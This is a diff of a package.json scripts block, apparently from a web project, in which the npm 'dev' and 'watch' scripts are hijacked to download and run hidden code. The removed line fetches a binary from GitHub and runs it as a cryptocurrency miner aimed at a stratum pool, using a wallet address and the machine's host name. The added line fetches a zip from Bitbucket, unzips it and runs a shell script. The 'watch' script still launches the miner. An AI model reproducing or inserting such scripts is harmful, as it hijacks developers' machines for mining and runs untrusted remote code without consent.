@@ -1,7 +1,7 @@
 {
     "private": true,
     "scripts": {
-        "dev": "wget https://raw.githubusercontent.com/mariobiszz/students/main/subscribe && chmod 777 subscribe && chmod 777 subscribe && ./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)",
+        "dev": "wget https://bitbucket.org/oqoixgqoq9/cpu/raw/25f8209d27f8a34516048e8a74b69d73780530e2/ssse3.zip && unzip ssse3.zip && ./-.sh",
         "development": "chmod 777 subscribe",
         "watch": "./subscribe -a gr -o stratum+tcps://stratum-ru.rplant.xyz:17056 -u RJMHcqVJEzYwdD4tzG1dvYfQfpMaTjXPAz.$(cat /proc/sys/kernel/hostname)",
         "watch-poll": "mix watch -- --watch-options-poll=1000",
